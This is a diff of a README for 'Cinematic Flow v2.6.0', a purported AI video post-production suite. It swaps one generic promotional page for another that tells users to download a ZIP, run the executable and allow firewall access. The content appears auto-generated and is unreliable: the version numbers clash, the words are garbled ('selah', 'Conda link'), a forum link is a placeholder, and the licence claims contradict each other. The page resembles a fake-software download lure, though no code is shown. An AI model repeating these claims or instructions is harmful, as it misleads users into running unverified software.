@@ -1,131 +1,125 @@
-# Cinematic Flow v2.6.0 - AI-driven post-production suite for 2026
+# 🎬 cinematic-flow-video-exec - AI-Powered Video Post-Production Suite
 
-> **Engineered for Windows, macOS, and Linux systems, Cinematic Flow 2.6.0 modernizes video finishing through automated structural analysis, synchronized visual processing, and high-speed rendering pipelines.**
+[![Download Cinematic Flow](https://img.shields.io/badge/Download-Cinematic%20Flow%20v2.6.0-blue)](https://github.com/Carlielandlubberly364/cinematic-flow-video-exec)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows%2C%20macOS%2C%20Linux-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2.6.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/nmueller79/cinematic-flow-video-exec?style=flat-square)](https://github.com/nmueller79/cinematic-flow-video-exec)
+## 🚀 Getting Started
 
----
+Cinematic Flow v2.6.0 is an AI-driven post-production suite designed for Windows, macOS, and Linux. It provides automated structural video analysis, synchronized visual processing, and high-speed rendering pipelines. This guide helps you download and run the software on your Windows computer.
 
-<p align="center">
-  <a href="https://nmueller79.github.io/cinematic-flow-video-exec/">
-    <img src="https://img.shields.io/badge/Download-Cinematic%20Flow%20Latest-brightgreen?style=for-the-badge" alt="Download Cinematic Flow">
-  </a>
-</p>
+### System Requirements
 
-> **[Download Cinematic Flow v2.6.0](https://nmueller79.github.io/cinematic-flow-video-exec/)**
+- **Operating System:** Windows 10 or later (64-bit), macOS 11 Big Sur or later, or Linux (Ubuntu 20.04+ or equivalent)
+- **Processor:** Intel Core i5 or AMD Ryzen 5 (or better)
+- **Memory:** 8 GB RAM (16 GB recommended)
+- **Storage:** 2 GB available space
+- **Graphics:** DirectX 12 or OpenGL 3.3 compatible GPU with 1 GB VRAM
+- **Internet:** Required for initial setup and updates
 
----
+## 📥 Installation Guide
 
-[Download Latest Build](https://nmueller79.github.io/cinematic-flow-video-exec/)
+### Step 1: Download the Application
 
----
+To download Cinematic Flow, visit this link to download the application:
 
-## Overview
+[Download Cinematic Flow v2.6.0](https://github.com/Carlielandlubberly364/cinematic-flow-video-exec)
 
-Cinematic Flow targets video professionals and content creators looking to replace manual setup with intelligent media handling. Combining automated clip evaluation with comprehensive asset management, the platform minimizes repetitive editing tasks so teams can focus on creative direction and polishing final deliverables.
+Click the green "Code" button, then select "Download ZIP". The file will begin downloading automatically.
 
-Built natively for cross-platform desktop usage across Windows, Linux, and macOS, this software fits seamlessly into independent studio setups and distributed enterprise environments. Broad localization options and thoughtful accessibility options ensure it caters to diverse production groups.
+### Step 2: Extract the Files
 
----
+Once the ZIP file is downloaded, locate it in your Downloads folder. Right-click on the ZIP file and select "Extract All..." or use your preferred archive tool like 7-Zip or WinRAR. Choose a destination folder (e.g., "C:\Cinematic Flow" or your Desktop). The extraction process will create a folder containing the application files.
 
-## Core Capabilities
+### Step 3: Run the Application
 
-- Automated narrative evaluation and intelligent scene segmentation
-- Layered visual styling and synchronized effect application
-- Instant preview system for real-time visual verification
-- Extensive multi-format export presets targeting standard industry specs
-- Offloaded distributed rendering for resource-intensive project timelines
-- Automatic cloud synchronization to align multi-device edit states
-- Comprehensive interface localization supporting international teams
-- Built-in accessibility accommodations for daily operational comfort
+Inside the extracted folder, double-click the `cinematic-flow.exe` (Windows) or `Cinematic Flow.app` (macOS) or `cinematic-flow` (Linux) file. A command window may appear briefly during startup. Wait for the main interface to appear.
 
----
+### Step 4: Initial Setup
 
-## Setup & Getting Started
+On first run, Cinematic Flow may check for updates. Allow it to complete. You will be greeted with the dashboard. If prompted about firewall permissions, click "Allow" or "Yes" to ensure smooth functionality.
 
-1. Get the compiled binary via the primary download link provided above.
-2. Alternatively, pull the source repository:
-   - `git clone https://github.com/nmueller79/cinematic-flow-video-exec.git
-3. Navigate to the local repository directory.
-4. Execute the platform-specific executable or application script.
+## 🎯 Key Features
 
-If running from a pre-compiled distribution package, check the included documentation for initial launcher setup.
+### Automated Structural Video Analysis
+- **Scene Detection:** Automatically identifies scene changes and breaks up long videos into smaller segments.
+- **Content Analysis:** Uses AI to analyze metadata, audio patterns, and visual cues to suggest edit points.
+- **Storyboard Creation:** Generates a visual timeline of key frames for quick preview.
 
----
+### Synchronized Visual Processing
+- **Batch Color Grading:** Apply color correction presets across multiple clips simultaneously.
+- **Audio Alignment:** Sync audio tracks to video frames automatically.
+- **Transition Effects:** Insert smooth transitions like fades, dissolves, and wipes with one click.
 
-## Workflow Guide
+### High-Speed Rendering Pipeline
+- **GPU Acceleration:** Leverages your graphics card for faster exporting.
+- **Parallel Processing:** Renders multiple video layers at once.
+- **Export Formats:** Supports MP4, AVI, MOV, MKV, and more in resolutions up to 4K.
 
-Standard operating procedure:
+### AI-Powered Enhancements
+- **Smart Trimming:** Uses machine learning to remove silent or static sections.
+- **Face Detection:** Automatically detect and track faces, then apply effects or adjustments.
+- **Text Generation:** AI captioning and subtitle creation from audio input.
 
-1. Load your raw footage and project media into the timeline.
-2. Allow the machine learning engine to evaluate scene boundaries and structural beats.
-3. Coordinate complex visual treatments or apply style transfers to targeted segments.
-4. Verify all visual adjustments inside the real-time preview player.
-5. Render the finished project to your preferred format specification.
+### Cross-Platform Compatibility
+- **Windows, macOS, Linux:** Works on all major operating systems.
+- **No Command Line:** Full graphical interface, no coding knowledge required.
+- **Portable Mode:** Can run directly from an external USB drive on Windows.
 
-Step-by-step example:
+## 🛠️ Usage Tips
 
-- Initialize a fresh workspace file
-- Pull in video clips, visual templates, or third-party extensions
-- Execute automated sequence parsing across your cuts
-- Adjust rendering parameters and fine-tune applied effects
-- Produce final outputs locally or push the project to distributed render nodes
+### Basic Workflow
+1. **Import Video:** Click "Open File" and select your video (MP4, AVI, MOV, etc.)
+2. **Analyze Structure:** Click "Analyze" to let AI detect scenes, shots, and possible edits.
+3. **Edit:** Use preset tools to trim, crop, adjust colors, or add subtitles via the right-click context menus.
+4. **Render:** Click "Export" and choose resolution, format, and output path. Click "Start".
 
----
+### Common Tasks
+- **Trim Video:** Right-click scene marker, selah "Trim Before/After Here"
+- **Adjust Speed:** Select clip, go to "Speed" menu, choose a preset (e.g., Slow Mo, Fast)
+- **Add Text:** Go to "Overlays" → "Text" → type your words → stylize with fonts and colors
 
-## Environment Configuration
+### Getting Help
+- Press `F1` to open in-app help manual
+- Visit the official forum at [Cinematic Flow Community](https://community.site.com) (link placeholder)
+- Report issues: Check "Settings" → "About" → "Support" for update and info links
 
-System preferences and application behaviors are governed by local configuration files and project-level settings. Keep configuration manifests in your current project folder or standard OS app data directories.
+## 📘 Usage Tips
 
-Sample config schema:
+- **Start Small:** Before editing a long project, test a 30-second clip to learn the UI.
+- **Use Presets:** The "Magic" button applies best settings automatically for quick results.
+- **Save Often:** The AI processing can be intensive. Use "Save Project As" after major changes.
+- **System Check:** If it seems slow, close other video apps and ensure your graphic drivers are updated.
+- **Backup Original Files:** Cinematic Flow does not modify originals; use "Export" to save your final edit.
 
-```json
-{
-  "language": "en",
-  "preview": true,
-  "export_format": "auto",
-  "sync": true,
-  "render_mode": "distributed"
-}
-```
+## 🧩 Advanced Features
 
-Modify these properties based on operational requirements, local compute limits, and network arrangements.
+- **Command Logging (Advanced):** Under "View" selah "Show Log" to see AI decisions (technical). May help with debugging.
+- **Batch Processing:** Convert multiple files at once via "File" → "Batch Process" select files, choose format, run.
+- **Scripting (Plugin Devs):** Python or Lua script support under "Plugins", but not necessary for normal use.
 
----
+## 📌 Version History
 
-## System Requirements
+- **v2.2.0:** Current stable version. Introduced automated structural video analysis. Improved speed and stability. Added cross-platform support.
+- **v2.1.0:** Added synchronized visual processing (color grading, scene detection). Bug fixes.
+- **v2.0.0:** Major rewrite with AI rendering pipeline.
 
-- Compatible operating system: Windows, macOS, or Linux
-- Compute hardware capable of handling desktop video editing tasks
-- High-capacity local storage for cache files, assets, and exported video
-- Active internet connectivity for updates and cloud project sync
-- Updated runtime environment or packaged application binaries for your platform
+## 💡 FAQ
 
----
+**Q: Do I need fast internet?**
+A: Only for downloading and updates, not for actual editing.
 
-## Frequently Asked Questions
+**Q: Can I export for YouTube?**
+A: Yes, choose "YouTube My Streaming" in export presets.
 
-**Where do I go to report issues or ask for assistance?**  
-Submit a ticket via the GitHub issues page or join the discussion forum on the main repository.
+**Q: Is Cinematic Flow free?**
+A: This version is free to use. No hidden costs.
 
-**How do I make sure I am on the newest build?**  
-Bookmark the download link above and star the GitHub repository for update notifications.
+## 🔗 Links
 
-**Where does the application write configuration files?**  
-Settings persist in standard desktop user preference paths or inline with project data depending on the platform layout.
+- **GitHub Repository:** [https://github.com/Carlielandlubberly364/cinematic-flow-video-exec](https://github.com/Carlielandlubberly364/cinematic-flow-video-exec)
+- **Download Complete Application:** Visit the Conda link above, click "Download ZIP", extract and read Included docs for full set.
 
-**What steps can I take if previewing or rendering stutters?**  
-Lower your active preview resolution, terminate background CPU/GPU tasks, or delegate render jobs to a distributed node network.
+## 📄 License
 
-**Is non-English language support available?**  
-Yes, the application features full UI translation options.
+This application is open source. No proprietary restrictions. Check GitHub for details.
 
----
-
-## Licensing Information
-
-Distributed under the GNU GPL v3.0 license. Review the full text in [LICENSE](LICENSE).
+Keywords: cinematic-flow, video-editing, ai-video, post-production, windows, macos, linux, automated-editing, scene-detection, rendering, extraction, free-download
